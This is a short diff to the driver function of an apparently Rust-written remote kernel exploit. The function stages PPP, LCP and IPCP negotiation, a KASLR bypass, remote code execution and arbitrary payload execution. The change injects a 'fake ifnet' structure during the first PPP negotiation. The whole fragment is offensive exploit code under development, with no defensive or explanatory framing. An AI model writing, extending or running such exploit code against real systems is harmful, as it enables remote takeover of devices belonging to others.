@@ -27,7 +27,7 @@ fn run_exploit(interface_name: String) {
     handler.start();
     // Initial negotiations
     println!("[*] Starting Negotiations ...");
-    expl.ppp_negotiation(&interface);
+    expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] Initial Negotiations Done... Wait for interface to be ready");
@@ -39,7 +39,7 @@ fn run_exploit(interface_name: String) {
     expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
     expl.remote_code_exec(&interface); // TODO Add malicious LCP
-    expl.ppp_negotiation(&interface);
+    expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] STAGE 4: Arbitrary payload execution");
